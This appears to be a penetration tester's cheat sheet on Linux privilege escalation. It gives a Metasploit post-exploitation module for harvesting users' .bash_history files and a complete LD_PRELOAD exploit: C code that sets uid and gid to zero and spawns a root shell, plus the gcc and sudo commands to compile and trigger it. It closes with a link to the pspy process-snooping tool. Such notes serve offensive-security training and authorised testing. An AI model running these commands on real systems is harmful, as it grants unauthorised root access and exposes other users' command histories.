# Linux Privilege Escalation

### Metasploit



Enumerate user .bash\_history using metasploit

from .bash\_history we can get juicy information there

```
use post/linux/gather/enum_users_history
set session <session_id>
run
```

### LD\_PRELOAD Privileges Escalation



{% hint style="info" %}
check in sudo -l

env_keep+=LDPRELOAD_\
\
_and check the run the following commands_
{% endhint %}

generate a C program in /tmp with C code :&#x20;

```
nano /tmp/shell.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

then run&#x20;

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <program run as root>
```

### ENum

{% embed url="https://github.com/DominicBreuker/pspy" %}
